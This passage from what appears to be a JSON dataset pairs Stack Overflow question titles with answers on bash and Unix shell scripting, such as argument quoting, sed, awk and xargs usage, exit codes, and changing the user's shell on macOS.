(stdin, stdout, stderr, from C). These are sometimes known as streams, and are defaulted to be directed to a terminal on most systems. On UNIX they are the first three file-descriptors, on Windows the first three file handles, 0, 1, 2 on both. A program can direct these to any file system to which it has appropriate access, but usually it does not - it often inherits them from its parent process (not all OSs did this in the past).\nOn Windows, a \"Console\" program is one which has a console window, often incorrectly known as a \"DOS box\". So, cmd.exe is a console program, but so is perl.exe, and so is python.exe (but not pythonw.exe).\nA command prompt is the invitation to type which is displayed by a Command Line Interpreter, or CLI. By convention on UNIX it ends with a $ for all users except root, which ends with a #. csh does not follow this convention and uses a %. Generally the prompt on a Windows CLI ends with a >. In all cases these can be altered by the user.\nI believe that the shortcut and window title for cmd.exe on Windows has the label \"Command Prompt\" because it gives access to a command-prompt. I have a Microsoft Press book called \"Windows Command-Line\" which says \"The command line is ... accessed through the command shell window\". So even Microsoft mix their terms.\nSo, cmd.exe is a shell and a CLI, and a console program. sqlplus is a CLI but not a shell, on Windows it is a console program. Windows Explorer is a shell but not a CLI or a console program. Bash and Korn shell are both shells that have a CLI, and can be run from a console, but not exclusively so.",
    "How to copy a table from one mysql database to another mysql database": "",
    "Pass private key password to openvpn command directly in Ubuntu 10.10 [closed]": "In my openvpn.conf:\n...\naskpass /etc/openvpn/jdoe.pass   <<< new line here\nca /etc/openvpn/jdoe_ca.crt\ncert /etc/openvpn/jdoe.crt\nkey /etc/openvpn/jdoe.key\n...\nThe file /etc/openvpn/jdoe.pass just contains the password. You can chmod this file to 600. This method save my life... ;-)\nUbuntu 12.04.4 LTS\nOpenVPN 2.2.1 x86_64-linux-gnu [SSL] [LZO2] [EPOLL] [PKCS11] [eurephia] [MH] [PF_INET6] [IPv6 payload 20110424-2 (2.2RC2)] built on Mar 13 2014",
    "Need bash shell script for reading name value pairs from a file": "If all lines in the input file are of this format, then simply sourcing it will set the variables:\nsource nameOfFileWithKeyValuePairs\nor\n. nameOfFileWithKeyValuePairs",
    "Assign grep count to variable": "To assign the output of a command, use var=$(cmd) (as shellcheck automatically tells you if you paste your script there).\n#!/bin/bash\nsome_var=$(grep -c \"some text\" /tmp/somePath)\necho \"var value is: ${some_var}\"",
    "Absolute value of a number": "You might just take ${var#-}.\n${var#Pattern} Remove from $var the shortest part of $Pattern that matches the front end of $var. tdlp\nExample:\ns2=5; s1=4\ns3=$((s1-s2))\n\necho $s3\n-1\n\necho ${s3#-}\n1",
    "Extract package.json version using shell script": "Credit to metakermit\nNODE_VERSION=$(node -p -e \"require('./package.json').version\")\necho $NODE_VERSION",
    "How to get absolute path name of shell script on MacOS?": "Another (also rather ugly) option:\nABSPATH=$(cd \"$(dirname \"$0\")\"; pwd -P)\nFrom pwd man page,\n-P      Display the physical current working directory (all symbolic links resolved).",
    "Use xargs to mv a directory from find results into another directory": "With BSD xargs (for OS X and FreeBSD), you can use -J which was built for this:\nfind . -name some_pattern -print0 | xargs -0 -J % mv % target_location\nThat would move anything matching some_pattern in . to target_location\nWith GNU xargs (for Linux and Cygwin), use -I instead:\nfind . -name some_pattern -print0 | xargs -0 -I % mv % target_location\nThe deprecated -i option of GNU xargs implies -I{} and can be used as follows:\nfind . -name some_pattern -print0 | xargs -0 -i mv {} target_location\nNote that BSD xargs also has a -I option, but that does something else.",
    "Interactive shell using PHP": "",
    "find directories having size greater than x MB": "If I'm interpreting your question right, I think this might be what you want:\ncd /home\ndu -sm * | awk '$1 > 1000'\nThis will show all directories in /home that contain more than 1000MB. If your version of du doesn't support -m, you can use du -sk and adjust the awk bit to look for more than 1,000,000KB instead...",
    "How to add text at the end of each line in unix": "There are many ways:\nsed: replace $ (end of line) with the given text.\n$ sed 's/$/ | COUNTRY/' file\nindia | COUNTRY\nsudan | COUNTRY\njapan | COUNTRY\nfrance | COUNTRY\nawk: print the line plus the given text.\n$ awk '{print $0, \"| COUNTRY\"}' file\nindia | COUNTRY\nsudan | COUNTRY\njapan | COUNTRY\nfrance | COUNTRY\nFinally, in pure bash: read line by line and print it together with the given text. Note this is discouraged as explained in Why is using a shell loop to process text considered bad practice?\n$ while IFS= read -r line; do echo \"$line | COUNTRY\"; done < file\nindia | COUNTRY\nsudan | COUNTRY\njapan | COUNTRY\nfrance | COUNTRY",
    "Invoking program when a bash function has the same name": "You can use the command built-in to suppress shell function lookups.\ncommand: command [-pVv] command [arg ...]\n    Execute a simple command or display information about commands.\n\n    Runs COMMAND with ARGS suppressing  shell function lookup, or display\n    information about the specified COMMANDs.  Can be used to invoke commands\n    on disk when a function with the same name exists.\n\n    Options:\n      -p    use a default value for PATH that is guaranteed to find all of\n        the standard utilities\n      -v    print a description of COMMAND similar to the `type' builtin\n      -V    print a more verbose description of each COMMAND\n\n    Exit Status:\n    Returns exit status of COMMAND, or failure if COMMAND is not found.",
    "How to test if string matches a regex in POSIX shell? (not bash)": "The [[ ... ]] are a bash-ism. You can make your test shell-agnostic by just using grep with a normal if:\nif echo \"$string\" | grep -q \"My\"; then\n    echo \"It's there!\"\nfi",
    "Curl \"write out\" value of specific header": "The variables specified for \"-w\" are not directly connected to the http header. So it looks like you have to \"parse\" them on your own:\ncurl -I \"server/some/resource\" | grep -Fi etag | sed -r 's/.*\"(.*)\".*/\\1/'",
    "How to install Git Shell": "If you have GitHub for Windows (installed, it should come with your shortcut.\nIt is a shortcut to:\nC:\\Users\\Username\\AppData\\Local\\GitHub\\GitHub.appref-ms --open-shell\nMore recent versions of G4W (see answer below) could have it at:\n%LOCALAPPDATA%\\Apps\\2.0\\...\\...\\\nC:\\Users\\Username\\AppData\\Local\\Apps\\2.0\\GitHub\\GitHub.appref-ms --open-shell\nIf that shell complains about the absence of git, launch \"G4W\" itself, which will extract git.\nSee \"Where is git.exe located?\".\nAs mentioned below, to restore the shortcut, after having run the first command, execute in the Git shell:\ngithub --reinstall-shortcuts",
    "How do I use a guid in a mongodb shell query": "You can use easily:\n.find({ \"_id\" : CSUUID(\"E3E45566-AFE4-A564-7876-AEFF6745FF\")})",
    "Shell script spawning a process after a delay": "& starts a background job, so\nsleep 60 && echo \"A\" &",
    "Running a Sqlite3 Script from Command Line": "The parameter you give to the sqlite3 program is the database file name.\nTo execute commands from a file, you must redirect the input to that file:\n$ sqlite3 mydatabase.db < SQLTableTransfer\nor tell it to read from that file:\n$ sqlite3 mydatabase.db \".read SQLTableTransfer\"",
    "Adding a shebang causes No such file or directory error when running my python script": "I had similar problems and it turned out to be problem with line-endings. You use windows/linux/mac line endings?\nEdit: forgot the script name, but as OP says, it's dos2unix <filename>",
    "shell script respond to keypress": "read -rsn1\nExpect only one letter (and don't wait for submitting) and be silent (don't write that letter back).",
    "How to simulate touch from background service with sendevent or other way?": "",
    "Linux/Ubuntu set: Illegal option -o pipefail": "You are running bin/sh, on Ubuntu it is a symbolic link pointing to /bin/dash, but pipefail is a bashism.\nMake the script executable:\nchmod +x myscript.sh\nand then run the script as follows:\nsudo ./myscript.sh",
    "Why do some people put a semicolon after an if condition in shell scripts? [duplicate]": "if [ $a == $b ]; then\n  echo \"a == b\"\nfi\nYou can use a semicolon, or you can write then on a separate line. Either one is allowed.\nif [ $a == $b ]\nthen\n  echo \"a == b\"\nfi\nHaving neither a ; nor a newline is a syntax error.\n$ if [ $a == $b ] then\n>   echo \"a == b\"\n> fi\nbash: syntax error near unexpected token `fi'\nAs for [ vs [[, see:\nWhat's the difference between [ and [[ in Bash?",
    "Using Travis CI for testing on UNIX shell scripts": "Absolutely.\nI made a simple test here: https://travis-ci.org/soulseekah/test-shunit2-travis\nMy .travis.yml file is:\nlanguage: bash\n\nbefore_script:\n    - curl -L \"https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/shunit2/shunit2-2.1.6.tgz\" | tar zx\n\nscript:\n    - bash equality_test.sh\nRepository: https://github.com/soulseekah/test-shunit2-travis",
    "How can I get both the process id and the exit code from a bash script?": "The pid is in $!, no need to run jobs. And the return status is returned by wait:\n$executable >> $log 2>&1 &\npid=$!\nwait $!\necho $?  # return status of $executable\nEDIT 1\nIf I understand the additional requirement as stated in a comment, and you want the script to return immediately (without waiting for the command to finish), then it will not be possible to have the initial script write the exit status of the command. But it is easy enough to have an intermediary write the exit status as soon as the child finishes. Something like:\nsh -c \"$executable\"' & echo pid=$! > pidfile; wait $!; echo $? > exit-status' &\nshould work.\nEDIT 2\nAs pointed out in the comments, that solution has a race condition: the main script terminates before the pidfile is written. The OP solves this by doing a polling sleep loop, which is an abomination and I fear I will have trouble sleeping at night knowing that I may have motivated such a travesty. IMO, the correct thing to do is to wait until the child is done. Since that is unacceptable, here is a solution that blocks on a read until the pid file exists instead of doing the looping sleep:\n{ sh -c \"$executable > $log 2>&1 &\"'\necho $! > pidfile\necho   # Alert parent that the pidfile has been written\nwait $!\necho $? > exit-status\n' & } | read",
    "Use tee (or equivalent) but limit max file size or rotate to new file": "use split:\nmy_program | tee >(split -d -b 100000 -)\nOr if you don't want to see the output, you can directly pipe to split:\nmy_program | split -d -b 100000 -\nAs for the log rotation, there's no tool in coreutils that does it automatically. You could create a symlink and periodically update it using a bash command:\nwhile ((1)); do ln -fns target_log_name $(ls -t | head -1); sleep 1; done",
    "${1:+\"$@\"} in /bin/sh": "'Hysterical Raisins', aka Historical Reasons.\nThe explanation from JesperE (or the Bash man page on shell parameter expansion) is accurate for what it does:\nIf $1 exists and is not an empty string, then substitute the quoted list of arguments.\nOnce upon 20 or so years ago, some broken minor variants of the Bourne Shell substituted an empty string \"\" for \"$@\" if there were no arguments, instead of the correct, current behaviour of substituting nothing. Whether any such systems are still in use is open to debate.\n[Hmm: that expansion would not work correctly for:\ncommand '' arg2 arg3 ...\nIn this context, the correct notation is:\n${1+\"$@\"}\nThis works correctly whether $1 is an empty argument or not. So, someone remembered the notation incorrectly, accidentally introducing a bug.]",
    "How to modify a key's value in a JSON file from command line": "One way to achieve it is by using the \"json\" npm package, e.g.:\njson -I -f package.json -e \"this.name='adar'\"\nAnother way is by using the jq CLI, e.g.:\nmv package.json temp.json\njq -r '.name |= \"adar\"' temp.json > package.json\nrm temp.json",
    "Is there an alternative for .bashrc for /bin/sh?": "In Arch, /bin/sh is a symlink to /bin/bash, which has quite a few rules about startup scripts, with special cases when called sh :\nIf bash is invoked with the name sh, it tries to mimic the startup behavior of historical versions of sh as closely as possible, ...\nIf you start it from the console, without any command, i.e. as an interactive, non-login shell, you should use the ENV variable :\nexport ENV=~/.profile\nsh\nor\nENV=~/.profile sh \nWhen invoked as an interactive [non login] shell with the name sh, bash looks for the variable ENV, expands its value if it is defined, and uses the expanded value as the name of a file to read and execute.\nAlternatively you can use the --login option to make it behave like a login shell, and read the .profile file.\nsh --login\nWhen invoked as an interactive login shell [with the name sh], or a non-interactive shell with the --login option, it first attempts to read and execute commands from /etc/profile and ~/.profile, in that order",
    "Parse URL in shell script": "[EDIT 2019] This answer is not meant to be a catch-all, works for everything solution it was intended to provide a simple alternative to the python based version and it ended up having more features than the original.\nIt answered the basic question in a bash-only way and then was modified multiple times by myself to include a hand full of demands by commenters. I think at this point however adding even more complexity would make it unmaintainable. I know not all things are straight forward (checking for a valid port for example requires comparing hostport and host) but I would rather not add even more complexity.\n[Original answer]\nAssuming your URL is passed as first parameter to the script:\n#!/bin/bash\n\n# extract the protocol\nproto=\"$(echo $1 | grep :// | sed -e's,^\\(.*://\\).*,\\1,g')\"\n# remove the protocol\nurl=\"$(echo ${1/$proto/})\"\n# extract the user (if any)\nuser=\"$(echo $url | grep @ | cut -d@ -f1)\"\n# extract the host and port\nhostport=\"$(echo ${url/$user@/} | cut -d/ -f1)\"\n# by request host without port    \nhost=\"$(echo $hostport | sed -e 's,:.*,,g')\"\n# by request - try to extract the port\nport=\"$(echo $hostport | sed -e 's,^.*:,:,g' -e 's,.*:\\([0-9]*\\).*,\\1,g' -e 's,[^0-9],,g')\"\n# extract the path (if any)\npath=\"$(echo $url | grep / | cut -d/ -f2-)\"\n\necho \"url: $url\"\necho \"  proto: $proto\"\necho \"  user: $user\"\necho \"  host: $host\"\necho \"  port: $port\"\necho \"  path: $path\"\nI must admit this is not the cleanest solution but it doesn't rely on another scripting language like perl or python. (Providing a solution using one of them would produce cleaner results ;) )\nUsing your example the results are:\nurl: user@host.net/some/random/path\n  proto: sftp://\n  user: user\n  host: host.net\n  port:\n  path: some/random/path\nThis will also work for URLs without a protocol/username or path. In this case the respective variable will contain an empty string.\n[EDIT]\nIf your bash version won't cope with the substitutions (${1/$proto/}) try this:\n#!/bin/bash\n\n# extract the protocol\nproto=\"$(echo $1 | grep :// | sed -e's,^\\(.*://\\).*,\\1,g')\"\n\n# remove the protocol -- updated\nurl=$(echo $1 | sed -e s,$proto,,g)\n\n# extract the user (if any)\nuser=\"$(echo $url | grep @ | cut -d@ -f1)\"\n\n# extract the host and port -- updated\nhostport=$(echo $url | sed -e s,$user@,,g | cut -d/ -f1)\n\n# by request host without port\nhost=\"$(echo $hostport | sed -e 's,:.*,,g')\"\n# by request - try to extract the port\nport=\"$(echo $hostport | sed -e 's,^.*:,:,g' -e 's,.*:\\([0-9]*\\).*,\\1,g' -e 's,[^0-9],,g')\"\n\n# extract the path (if any)\npath=\"$(echo $url | grep / | cut -d/ -f2-)\"",
    "Parallel download using Curl command line utility": "My answer is a bit late, but I believe all of the existing answers fall just a little short. The way I do things like this is with xargs, which is capable of running a specified number of commands in subprocesses.\nThe one-liner I would use is, simply:\n$ seq 1 10 | xargs -n1 -P2 bash -c 'i=$0; url=\"http://example.com/?page${i}.html\"; curl -O -s $url'\nThis warrants some explanation. The use of -n 1 instructs xargs to process a single input argument at a time. In this example, the numbers 1 ... 10 are each processed separately. And -P 2 tells xargs to keep 2 subprocesses running all the time, each one handling a single argument, until all of the input arguments have been processed.\nYou can think of this as MapReduce in the shell. Or perhaps just the Map phase. Regardless, it's an effective way to get a lot of work done while ensuring that you don't fork bomb your machine. It's possible to do something similar in a for loop in a shell, but end up doing process management, which starts to seem pretty pointless once you realize how insanely great this use of xargs is.\nUpdate: I suspect that my example with xargs could be improved (at least on Mac OS X and BSD with the -J flag). With GNU Parallel, the command is a bit less unwieldy as well:\nparallel --jobs 2 curl -O -s http://example.com/?page{}.html ::: {1..10}",
    "Shell script not running, command not found": "For security reasons, the shell will not search the current directory (by default) for an executable. You have to be specific, and tell bash that your script is in the current directory (.):\n$ ./MigrateNshell.sh",
    "How do I use shell script to check if a bucket exists?": "",
    "Adding newline characters to unix shell variables": "Try $'\\n':\nVAR=a\nVAR=\"$VAR\"$'\\n'b\necho \"$VAR\"\ngives me\na\nb",
    "How to get the number of files in a folder as a variable?": "The quotes are causing the error messages.\nTo get a count of files in the directory:\nshopt -s nullglob\nnumfiles=(*)\nnumfiles=${#numfiles[@]}\nwhich creates an array and then replaces it with the count of its elements. This will include files and directories, but not dotfiles or . or .. or other dotted directories.\nUse nullglob so an empty directory gives a count of 0 instead of 1.\nYou can instead use find -type f or you can count the directories and subtract:\n# continuing from above\nnumdirs=(*/)\nnumdirs=${#numdirs[@]}\n(( numfiles -= numdirs ))\nAlso see \"How can I find the latest (newest, earliest, oldest) file in a directory?\"\nYou can have as many spaces as you want inside an execution block. They often aid in readability. The only downside is that they make the file a little larger and may slow initial parsing (only) slightly. There are a few places that must have spaces (e.g. around [, [[, ], ]] and = in comparisons) and a few that must not (e.g. around = in an assignment.",
    "When to use set -e": "Yes, you should always use it. People make fun of Visual Basic all the time, saying it's not a real programming language, partly because of its \u201cOn Error Resume Next\u201d statement. Yet that is the default in shell! set -e should have been the default. The potential for disaster is just too high.\nIn places where it's ok for a command to fail, you can use || true or its shortened form ||:, e.g.\ngrep Warning build.log ||:\nIn fact you should go a step further, and have\nset -eu\nset -o pipefail\nat the top of every bash script.\n-u makes it an error to reference a non-existent environment variable such as ${HSOTNAME}, at the cost of requiring some gymnastics with checking ${#} before you reference ${1}, ${2}, and so on.\npipefail makes things like misspeled-command | sed -e 's/^WARNING: //' raise errors.",
    "The difference between $* and $@ [duplicate]": "Unquoted, there is no difference -- they're expanded to all the arguments and they're split accordingly. The difference comes when quoting. \"$@\" expands to properly quoted arguments and \"$*\" makes all arguments into a single argument. Take this for example:\n#!/bin/bash\n\nfunction print_args_at {\n    printf \"%s\\n\" \"$@\"\n}\n\nfunction print_args_star {\n    printf \"%s\\n\" \"$*\"\n}\n\nprint_args_at \"one\" \"two three\" \"four\"\nprint_args_star \"one\" \"two three\" \"four\"\nThen:\n$ ./printf.sh \n\none\ntwo three\nfour\n\none two three four",
    "Do you need shebang in all bash scripts? [duplicate]": "The shebang is only mandatory for those scripts which shall be executed by the operating system in the same way as binary executables. If you source in another script, then the shebang is ignored.\nOn the other hand. IF a script is supposed to be sourced, then it is convention to NOT put any shebang at the start.",
    "Include header in the 'grep' result": "The following means you only need type the command once (rather than using && and typing it twice), it's also quite simple to understand.\nsome-command | { head -1; grep some-stuff; }\ne.g.\nps -ef | { head -1; grep python; }\nUPDATE: This only seems to work for ps, sorry, but I guess this is usually what people want this for.\nIf you want this to work for an arbitrary command, it seems you must write a mini script, e.g.:\n#!/bin/bash\n\nfirst_line=true\n\nwhile read -r line; do\n    if \"${first_line}\"; then\n        echo \"$line\"\n        first_line=false\n    fi\n    echo \"$line\" | grep $*\ndone\nWhich I've named hgrep.sh. Then you can use like this:\nps -ef | ./hgrep.sh -i chrome\nThe nice thing about this approach is that we are using grep so some of the flags work exactly the same.\nNOTE This doesn't work for flags that don't operate line-by-line, e.g. -A, -B, -C, etc. I see no trivial way to adjust the script to do this, as it likely requires buffering, which could break the latency expectations when comparing to pure grep. Open to ideas!",
    "Execute command containing quotes from shell variable [duplicate]": "Arrays are useful to keep your parameters whole:\ncommand=(su aUser -s /bin/bash -c 'echo A')\nand invoke it exactly like this:\n\"${command[@]}\"",
    "how to smart append LD_LIBRARY_PATH in shell when nounset": "You could use this construct:\nexport LD_LIBRARY_PATH=/mypath${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\nExplanation:\nIf LD_LIBRARY_PATH is not set, then ${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} expands to nothing without evaluating $LD_LIBRARY_PATH, thus the result is equivalent to export LD_LIBRARY_PATH=/mypath and no error is raised.\nIf LD_LIBRARY_PATH is already set, then ${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} expands to :$LD_LIBRARY_PATH, thus the result is equivalent to export LD_LIBRARY_PATH=/mypath:$LD_LIBRARY_PATH.\nSee the Bash Reference Manual / 3.5.3 Shell Parameter Expansion for more information on these expansions.\nThis is an important security practice as two adjacent colons or a trailing/leading colon count as adding the current directory to $PATH or $LD_LIBRARY_PATH. See also:\nWhat corner cases must we consider when parsing path on linux\nbash: $PATH ending in colon puts working directory in PATH\nHow Torch broke ls",
    "Check if file exists and whether it contains a specific string": "Instead of storing the output of grep in a variable and then checking whether the variable is empty, you can do this:\nif grep -q \"poet\" $file_name\nthen\n    echo \"poet was found in $file_name\"\nfi\n============\nHere are some commonly used tests:\n   -d FILE\n          FILE exists and is a directory\n   -e FILE\n          FILE exists\n   -f FILE\n          FILE exists and is a regular file\n   -h FILE\n          FILE exists and is a symbolic link (same as -L)\n   -r FILE\n          FILE exists and is readable\n   -s FILE\n          FILE exists and has a size greater than zero\n   -w FILE\n          FILE exists and is writable\n   -x FILE\n          FILE exists and is executable\n   -z STRING\n          the length of STRING is zero\nExample:\nif [ -e \"$file_name\" ] && [ ! -z \"$used_var\" ]\nthen\n    echo \"$file_name exists and $used_var is not empty\"\nfi",
    "Bash conditional based on exit code of command": "Just remove the brackets:\n#!/bin/bash\n\nif ./success.sh; then\n    echo \"First: success!\"\nelse\n    echo \"First: failure!\"\nfi\n\nif ./failure.sh; then\n    echo \"Second: success!\"\nelse\n    echo \"Second: failure!\"\nfi\nExplanation: the thing that goes between if and then is a command (or series of commands), the exit status of which is used to determine whether to run the then clause, or the else clause. This is exactly what you want.\nSo why do people use brackets in if statements? It's because normally you want to decide which branch of the if to run based on some conditional expression (is \"$a\" equal to \"$b\", does a certain file exist, etc). [ is actually a command which parses its arguments as a conditional expression (ignoring the final ]), and then exits with either success or failure depending on whether the conditional is true or false. Essentially, [ ] functions as an adapter that lets you use conditional expressions instead of command success/failure in your if statements. In your case, you want success/failure not a conditional expression, so don't use the adapter.\nBTW, you'll also sometimes see if [[ some expression ]]; then and if (( some expression )); then. [[ ]] and (( )) are conditional expressions built into bash syntax (unlike [, which is a command). [[ ]] is essentially a better version of [ ] (with some syntax oddities cleaned up and some features added), and (( )) is a somewhat similar construct that does arithmetic expressions.\nBTW2 another thing you'll see in scripts is the exit status being tested by checking the special parameter $?, which gives the exit status of the last command. It looks like this:\nsomecommand\nif [ $? -eq 0 ]; then\n    echo \"Somecommand: success!\"\nelse\n    echo \"Somecommand: failure!\"\nfi\nI really consider this cargo cult programming. People are used to seeing [ ] conditional expressions in if statements, and this idiom puts the success test in the form of a conditional expression. But let me run through how it works: it takes the exit status of the command, puts it in a conditional expression, has [ ] evaluate that and turn it right back into an exit status so if can use it. That whole rigamarole is unnecessary; just put the command directly in the if statement.",
    "Python | change text color in shell [duplicate]": "Use Curses or ANSI escape sequences. Before you start spouting escape sequences, you should check that stdout is a tty. You can do this with sys.stdout.isatty(). Here's a function pulled from a project of mine that prints output in red or green, depending on the status, using ANSI escape sequences:\ndef hilite(string, status, bold):\n    attr = []\n    if status:\n        # green\n        attr.append('32')\n    else:\n        # red\n        attr.append('31')\n    if bold:\n        attr.append('1')\n    return '\\x1b[%sm%s\\x1b[0m' % (';'.join(attr), string)",
    "How to exit from query result viewer in psql?": "Hit q. This closes many vim-like pagers, not only in psql, but also e.g. in 'less', 'git log', 'mutt', and many more.\nJust FYI: Hitting Ctrl + Z does not exit psql, it just suspends it and sends it to background. The program continues to run, and you can resume it by entering 'fg'. In Unix environments, Ctrl + C is usually the way to forcibly stop a program.",
    "How to compare two decimal numbers in bash/awk?": "You can do it using Bash's numeric context:\nif (( $(echo \"$result1 > $result2\" | bc -l) )); then\nbc will output 0 or 1 and the (( )) will interpret them as false or true respectively.\nThe same thing using AWK:\nif (( $(echo \"$result1 $result2\" | awk '{print ($1 > $2)}') )); then",
    "What is the difference between $* and $@": "There is no difference if you do not put $* or $@ in quotes. But if you put them inside quotes (which you should, as a general good practice), then $@ will pass your parameters as separate parameters, whereas $* will just pass all params as a single parameter.\nTake these scripts (foo.sh and bar.sh) for testing:\n>> cat bar.sh\necho \"Arg 1: $1\"\necho \"Arg 2: $2\"\necho \"Arg 3: $3\"\necho\n\n>> cat foo.sh\necho '$* without quotes:'\n./bar.sh $*\n\necho '$@ without quotes:'\n./bar.sh $@\n\necho '$* with quotes:'\n./bar.sh \"$*\"\n\necho '$@ with quotes:'\n./bar.sh \"$@\"\nNow this example should make everything clear:\n>> ./foo.sh arg1 \"arg21 arg22\" arg3\n$* without quotes:\nArg 1: arg1\nArg 2: arg21\nArg 3: arg22\n\n$@ without quotes:\nArg 1: arg1\nArg 2: arg21\nArg 3: arg22\n\n$* with quotes:\nArg 1: arg1 arg21 arg22 arg3\nArg 2:\nArg 3:\n\n$@ with quotes:\nArg 1: arg1\nArg 2: arg21 arg22\nArg 3: arg3\nClearly, \"$@\" gives the behaviour that we generally want.\nMore detailed description:\nCase 1: No quotes around $* and $@:\nBoth have same behaviour.\n./bar.sh $* => bar.sh gets arg1, arg2 and arg3 as separate arguments\n./bar.sh $@ => bar.sh gets arg1, arg2 and arg3 as separate arguments\nCase 2: You use quotes around $* and $@:\n./bar.sh \"$*\" => bar.sh gets arg1 arg2 arg3 as a single argument\n./bar.sh \"$@\" => bar.sh gets arg1, arg2 and arg3 as a separate arguments\nMore importantly, $* also ignores quotes in your argument list. For example, if you had supplied ./foo.sh arg1 \"arg2 arg3\", even then:\n./bar.sh \"$*\" => bar.sh will still receive arg2 and arg3 as separate parameters!\n./bar.sh \"$@\" => will pass arg2 arg3 as a single parameter (which is what you usually want).\nNotice again that this difference occurs only if you put $* and $@ in quotes. Otherwise they have the same behaviour.\nOfficial documentation: http://www.gnu.org/software/bash/manual/bash.html#Special-Parameters",
    "How to check if two paths are equal in Bash?": "Bash's test commands have a -ef operator for this purpose:\nif [[ ./ -ef ~ ]]; then ...\n\nif [[ ~/Desktop -ef /home/you/Desktop ]]; then ...\nHere is the documentation for this operator:\n$ help test | grep -e -ef\n      FILE1 -ef FILE2  True if file1 is a hard link to file2.\n$ help '[['\n[[ ... ]]: [[ expression ]]\n    Execute conditional command.\n\n    Returns a status of 0 or 1 depending on the evaluation of the conditional\n    expression EXPRESSION.  Expressions are composed of the same primaries used\n    by the `test' builtin, and may be combined using the following operators:\n\n      ( EXPRESSION )    Returns the value of EXPRESSION\n      ! EXPRESSION              True if EXPRESSION is false; else false\n      EXPR1 && EXPR2    True if both EXPR1 and EXPR2 are true; else false\n      EXPR1 || EXPR2    True if either EXPR1 or EXPR2 is true; else false\n\n[...snip...]\nNote that both paths of the operator have to refer to an existing file or directory for this to work. If the file or directory does not exist, the test will return false.\nIf you prefer, you can use the test or [ builtins instead of double brackets:\nif test ./ -ef ~; then ...\n\nif [ ./ -ef ~ ]; then ...\nbut [[ ... ]] is preferred for consistency, since it encompasses the complete functionality of test and [ in addition to other features, such as pattern matching and regex matching.",
    "Check if directory is git repository (without having to cd into it)": "Use git -C <path> rev-parse. It will return 0 if the directory at <path> is a git repository and an error code otherwise.\nFurther Reading:\nrev-parse\n-C <path>",
    "grab last n lines from console output": "./run_some_process 2>&1 | tail -10 >>logfle\ntail -10 will give you last ten lines, 2>&1 redirects stderr to stdout, >>logfle appends to logfile.",
    "sed command creating unwanted duplicates of file with -e extension": "On OSX sed (BSD) sed requires an extension after -i option. Since it is finding -e afterwards it is adding -e to each input filename. btw you don't even need -e option here.\nYou can pass an empty extension like this:\nsed -i '' 's/foo/bar/g' $file\nOr use .bak for an extension to save original file:\nsed -i.bak 's/foo/bar/g' $file",
    "bash double bracket issue": "The problem lies in your script invocation. You're issuing:\n$ sudo sh if_test.sh\nOn Ubuntu systems, /bin/sh is dash, not bash, and dash does not support the double bracket keyword (or didn't at the time of this posting, I haven't double-checked). You can solve your problem by explicitly invoking bash instead:\n$ sudo bash if_test.sh\nAlternatively, you can make your script executable and rely on the shebang line:\n$ chmod +x if_test.sh\n$ sudo ./if_test.sh\nAlso note that, when used between double square brackets, == is a pattern matching operator, not the equality operator. If you want to test for equality, you can either use -eq:\nif [[ \"14\" -eq \"14\" ]]; then \n    echo \"FOO\"\nfi\nOr double parentheses:\nif (( 14 == 14 )); then \n    echo \"FOO\"\nfi",
    "What does $- mean in Bash?": "$- prints The current set of options in your current shell.\nhimBH means following options are enabled:\nH - histexpand: when history expansion is enabled\nm - monitor: when job control is enabled\nh - hashall: Locate and remember (hash) commands as they are looked up for execution\nB - braceexpand: when brace expansion is enabled\ni - interactive: when current shell is interactive",
    "PHP - How to get Shell errors echoed out to screen": "",
    "How can I get iTerm to use the newer version of bash that brew shows? Change a user's shell on OSX": "bash --version (or bash -version) will NOT report the CURRENT shell's version, but the version of the bash executable that comes FIRST IN THE $PATH.\n[Note: OSX 10.10 (Yosemite) is the first OSX version where /usr/local/bin is placed BEFORE system paths such as /bin in the $PATH. Up to 10.9, system paths came first. Thus, at the time the OP asked his question, bash --version reported the SYSTEM's bash's version (/bin/bash), not the Homebrew-installed version (/usr/local/bin/bash)]\nIf you want to know the current Bash shell's version, use:\necho $BASH_VERSION\nIn other words: your shell may well have been changed successfully - your test was flawed.\nYou can use chsh to change the current user's shell, as follows:\n[Update: Switched to using /usr/local/bin/bash and later \"$(brew --prefix)/bin\" (to account for the fact that on M1 Macs and above the Homebrew root dir. is /opt/homewbrew rather than /usr/local) rather than a specific, versioned path in $(brew --prefix)/Cellar/bash/<version>/bin/bash, as Homebrew will automatically keep the symlink at $(brew --prefix)/bin/bash pointed to the most recent installed version. Tip of the hat to @drevicko.]\n# Determine the full path of the new shell.\nnewShell=\"$(brew --prefix)/bin/bash\"\n# Add the full path to the list of allowed shells - SUDO REQUIRED\nsudo bash -c \"echo \\\"$newShell\\\" >> /etc/shells\"\n# Then change to the new shell.\nchsh -s \"$newShell\"\nNote that you'll be prompted for your password.\nAny terminal tab/window you create from that point on will already use the new shell.\nBonus tip from @bmike: If you want to replace the current shell instance with an instance of the new shell right away, run:\nexec su - $USER  # instantly replaces current shell with an instance of the new shell\nNote that you'll be prompted for your password again.\nAlternatively, use dscl - the OSX Directory Services CLI - to change the current user's shell; this is more cumbersome, however.\nTo examine the current user's shell, use:\ndscl . -read /Users/$USER UserShell  # e.g. (default): 'UserShell: /bin/bash'\nor, more simply, echo $SHELL, which outputs only the file path (e.g., /bin/bash).\nTo change the current user's shell to, e.g., $(brew --prefix)/bin/bash, use:\n# SUDO REQUIRED\nsudo dscl . -change /Users/$USER UserShell /bin/bash \"$(brew --prefix)/bin/bash\"\nNote:\nthe penultimate (second-to-last) argument must be the value currently in effect.\nit is NOT necessary for the new value to be contained in /etc/shells for interactive use, but the comments in /etc/shells state Ftpd will not allow users to connect who are not using one of these shells.\nsimply quit and restart Terminal.app (or iTerm.app) for the change to take effect - verify the new shell with echo $BASH_VERSION - a reboot is NOT required.\nExplanation of errors encountered by the OP:\nchsh: /usr/local/Cellar/bash/4.2.45/bin/bash: non-standard shell implies that /usr/local/Cellar/bash/4.2.45/bin/bash was not - not yet, or not in this exact form - listed in /etc/shells.\n<main> attribute status: eDSAttributeNotFound: this dscl error occurs when the penultimate (next-to-last) argument specified for the -change command does not match the current attribute value - it is an - admittedly strange - requirement that an attribute's current value be specified in order to change it.\nWhile the question suggests that both conditions were met, I suspect that they weren't met at the right times, due to experimentation.",
